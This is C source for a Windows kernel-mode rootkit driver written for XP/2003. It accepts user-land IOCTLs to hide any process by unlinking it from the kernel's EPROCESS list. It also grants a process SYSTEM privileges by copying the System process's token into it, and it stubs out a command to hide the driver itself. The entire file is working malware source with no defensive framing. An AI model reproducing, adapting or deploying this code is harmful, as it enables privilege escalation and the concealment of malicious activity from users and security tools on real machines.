#include <wdm.h>
#include <ntddk.h>
#include <stdio.h>
#include <stdlib.h>

#define SIOCTL_TYPE 40000
#define IOCTL_HIDE_PROCESS CTL_CODE(SIOCTL_TYPE, 0x800, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_ELEVATION_PROCESS CTL_CODE(SIOCTL_TYPE, 0x802, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_HIDE_ROOTKIT CTL_CODE(SIOCTL_TYPE, 0x801, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)

#define SYSTEM_PROCESS "System"
#define PID_OFFSET 0x084
#define IMAGE_FILENAME_OFFSET 0x174
#define ACTIVE_PROCESS_LINKS_OFFSET 0x088
#define TOKEN_OFFSET 0xc8 /* NT = 0x108 - 2000 = 0x12c - XP/XP SP2/2003 = 0xc8 */

/* Prototypes */
PEPROCESS searchProcessByName(char *processName);
PEPROCESS searchProcessByPID(int pid);
int hideProcess(char *id);
unsigned long getProcessToken(char *processName);
int setProcessToken(char *processName, unsigned long token);

/* Global variables */
const WCHAR deviceNameBuffer[] = L"\\Device\\myRootkitDevice";
const WCHAR deviceLinkBuffer[] = L"\\DosDevices\\myLinkToMyRootkit";
UNICODE_STRING deviceLinkUnicodeString;
PDEVICE_OBJECT g_RootkitDevice;
char output[1024];

/* Unload the driver */
VOID DriverUnload(PDRIVER_OBJECT pDriverObject)
{	
	/* Remove the device */
	IoDeleteDevice(g_RootkitDevice);
	
	/* Remove symbolic link */
	IoDeleteSymbolicLink(&deviceLinkUnicodeString);
}

/* Major function : do nothing */
NTSTATUS OnStubDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	return STATUS_SUCCESS;
}

/* Major function : switch IOCTL from user-land */
NTSTATUS IoControlFunction(IN PDEVICE_OBJECT pDeviceObject, IN PIRP Irp)
{
	PIO_STACK_LOCATION IrpSp;
	ULONG FunctionCode;
	char *pBuf;
	int pBufLen, iReturn = 0;
	unsigned long token;

	/* Init */	
	IrpSp = IoGetCurrentIrpStackLocation(Irp);
	FunctionCode = IrpSp->Parameters.DeviceIoControl.IoControlCode;

    	/* Execute the request from user-land depending of the IOCTL */   
	switch(FunctionCode)
	{
		 /* Hide a process from the doubly-linked list EPROCESS */
		case IOCTL_HIDE_PROCESS:
			memset(output, 0, 1024);
			pBuf = Irp->AssociatedIrp.SystemBuffer;
			pBufLen = IrpSp->Parameters.DeviceIoControl.InputBufferLength;
			*(pBuf + pBufLen) = '\0';
			if (hideProcess(pBuf) == 0)
			{
				pBufLen += 26;
               			if (pBufLen > 1024)
                  			pBufLen = 1024;
               			_snprintf(output, (size_t) pBufLen, "the process %s is now hidden", pBuf);
               			RtlCopyMemory(pBuf , output, strlen(output));
            		}
            		else
            		{
               			pBufLen += 28;
               			if (pBufLen > 1024)
                  			pBufLen = 1024;                
               			_snprintf(output, (size_t) pBufLen, "unable to hide the process %s ", pBuf);
               			RtlCopyMemory(pBuf , output, strlen(output));
            		}
            		Irp->IoStatus.Status = STATUS_SUCCESS;
            		Irp->IoStatus.Information = strlen(output);
            		break;
 
		/* Steal the token of the process System and set it for the given process */
		case IOCTL_ELEVATION_PROCESS:
			memset(output, 0, 1024);
			pBuf = Irp->AssociatedIrp.SystemBuffer;
			pBufLen = IrpSp->Parameters.DeviceIoControl.InputBufferLength;
			*(pBuf + pBufLen) = '\0';
			token = getProcessToken(SYSTEM_PROCESS);
			if (token != 1 && setProcessToken(pBuf, token) == 0)
			{
				pBufLen += 38;
				if (pBufLen > 1024)
					pBufLen = 1024;                
				_snprintf(output, pBufLen, "token %X is now set for process %s", token, pBuf);
				RtlCopyMemory(pBuf , output, strlen(output));
			}
			else
			{
				pBufLen += 32;
				if (pBufLen > 1024)
					pBufLen = 1024;                
				_snprintf(output, (size_t) pBufLen, "unable to set token for process %s", pBuf);
				RtlCopyMemory(pBuf , output, strlen(output));
			}
			Irp->IoStatus.Status = STATUS_SUCCESS;
			Irp->IoStatus.Information = strlen(output);
			break;

		/* Hide the driver from the doubly-linked list MODULE_ENTRY */
        	case IOCTL_HIDE_ROOTKIT:
            		break;

		default: 
            		break;
	}
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING pRegistryPath) 
{
	int i;
	NTSTATUS ntStatus;
	UNICODE_STRING deviceNameUnicodeString;
	
	/* Init */
	RtlInitUnicodeString(&deviceNameUnicodeString, deviceNameBuffer);
	RtlInitUnicodeString(&deviceLinkUnicodeString, deviceLinkBuffer);

    	/* Create device */
	ntStatus = IoCreateDevice(pDriverObject, 0, &deviceNameUnicodeString, 0x0001234, 0, TRUE, &g_RootkitDevice );
	if (NT_SUCCESS(ntStatus))
	{
		ntStatus = IoCreateSymbolicLink(&deviceLinkUnicodeString, &deviceNameUnicodeString);
		if (!NT_SUCCESS(ntStatus)) 
			return 1;
	}

	/* Set unload function */
	pDriverObject->DriverUnload = DriverUnload;
	
	/* Set major functions */
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
		pDriverObject->MajorFunction[i] = OnStubDispatch;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControlFunction;		

	return STATUS_SUCCESS;
}

PEPROCESS searchProcessByName(char *processName)
{
  PEPROCESS startProcess, currentProcess;
  PLIST_ENTRY activeProcessLinks;
  
  /* Get the current process */
  startProcess = currentProcess = IoGetCurrentProcess();
 
  /* Switch to the next process from the doubly-linked list until the process name is found */
  do
  {
    if (!strncmp(((PUCHAR) currentProcess + IMAGE_FILENAME_OFFSET), processName, 
         strlen(((PUCHAR) currentProcess + IMAGE_FILENAME_OFFSET))))
    {
	/* Debug message */
      	DbgPrint("@EPROCESS : 0x%X -  @ActiveProcessLinks : 0x%X - ImageFilename : %s - PID : %d\n", 
		currentProcess, ((PUCHAR) currentProcess + ACTIVE_PROCESS_LINKS_OFFSET), 
		((PUCHAR) currentProcess + IMAGE_FILENAME_OFFSET), 
                *((int *)((PUCHAR) currentProcess + PID_OFFSET)));
      	return currentProcess;
    }

    /* Get the ActiveProcessLinks list of the current process*/
    activeProcessLinks = (PLIST_ENTRY)((PUCHAR) currentProcess + ACTIVE_PROCESS_LINKS_OFFSET);
    
    /* Switch to next process */
    currentProcess = (PEPROCESS) activeProcessLinks->Flink;
    currentProcess = (PEPROCESS)((PUCHAR) currentProcess - ACTIVE_PROCESS_LINKS_OFFSET);
   
  } while (startProcess != currentProcess);
 
  return NULL;
}

PEPROCESS searchProcessByPID(int pid)
{
  int *pid_next;
  PEPROCESS startProcess, currentProcess;
  PLIST_ENTRY activeProcessLinks;
  
  /* Get the current process */
  startProcess = currentProcess = IoGetCurrentProcess();
    
  /* Check if the pid is not negative*/
  if (pid < 1)
     return NULL;
  
  /* Switch to the next process from the doubly-linked list until the process name is found */
  do
  {
    /* Get the pid of the current process */
    pid_next = (int *)((PUCHAR) currentProcess + PID_OFFSET);            
    
    if (*pid_next == pid)
    {
    	/* Debug message */
      	DbgPrint("@EPROCESS : 0x%X -  @ActiveProcessLinks : 0x%X - ImageFilename : %s - PID : %d\n", 
		currentProcess, ((PUCHAR) currentProcess + ACTIVE_PROCESS_LINKS_OFFSET), 
		((PUCHAR) currentProcess + IMAGE_FILENAME_OFFSET), *pid_next);
      	return currentProcess;
    }

    /* Get the ActiveProcessLinks list of the current process*/
    activeProcessLinks = (PLIST_ENTRY)((PUCHAR) currentProcess + ACTIVE_PROCESS_LINKS_OFFSET);
    
    /* Switch to next process */
    currentProcess = (PEPROCESS) activeProcessLinks->Flink;
    currentProcess = (PEPROCESS)((PUCHAR) currentProcess - ACTIVE_PROCESS_LINKS_OFFSET);
   
  } while (startProcess != currentProcess);
 
  return NULL;
}

int hideProcess(char *id)
{
  PEPROCESS process;
  PLIST_ENTRY activeProcessLinks;
  int pid = 0;
  
  /* Search the process */
  if ((pid = atoi(id)) != 0) /* Search by PID */
     process = (PEPROCESS) searchProcessByPID(pid);
  else /* Search by name */
    process = (PEPROCESS) searchProcessByName(id);
  if (process == NULL)
    return 1;
  
  /* Remove the process from the doubly-linked list */
  activeProcessLinks = (PLIST_ENTRY)((PUCHAR) process + ACTIVE_PROCESS_LINKS_OFFSET);
  *((unsigned long *) activeProcessLinks->Blink) = (unsigned long) activeProcessLinks->Flink;
  *((unsigned long *)(activeProcessLinks->Flink) + 1) = (unsigned long) activeProcessLinks->Blink;
  activeProcessLinks->Blink = (PLIST_ENTRY) &activeProcessLinks->Flink;
  activeProcessLinks->Flink = (PLIST_ENTRY) &activeProcessLinks->Flink;
  
  return 0;
}

unsigned long getProcessToken(char *id)
{
  PEPROCESS process;
  unsigned long  token_addr, token;
  int pid;
            
  /* Search the process */
  if ((pid = atoi(id)) != 0) /* Search by PID */
     process = (PEPROCESS) searchProcessByPID(pid);
  else /* Search by name */
    process = (PEPROCESS) searchProcessByName(id);
  if (process == NULL)
    return 1;
                  
  /* Get the token address */
  token_addr = (unsigned long) process + TOKEN_OFFSET;

  /* Get the token value */
  token = *((unsigned long *) token_addr);

  /* Debug message */
  DbgPrint("process : %s - @token 0x%X - token = %X\n", ((PUCHAR) process + IMAGE_FILENAME_OFFSET), token_addr, token);

  return token;
}

int setProcessToken(char *id, unsigned long token)
{  
  PEPROCESS process;
  unsigned long  token_addr;
  int pid;
            
  /* Search the process */
  if ((pid = atoi(id)) != 0) /* Search by PID */
     process = (PEPROCESS) searchProcessByPID(pid);
  else /* Search by name */
    process = (PEPROCESS) searchProcessByName(id);
  if (process == NULL)
    return 1;
    
  /* Get the token address */
  token_addr = (unsigned long) process + TOKEN_OFFSET;

  /* Set the new token value */
  *((unsigned long *) token_addr) = token;

  /* Debug message */
  DbgPrint("process : %s - @token 0x%X - token = %X\n", ((PUCHAR) process + IMAGE_FILENAME_OFFSET), token_addr, *((unsigned long *) token_addr));

  return 0;
}
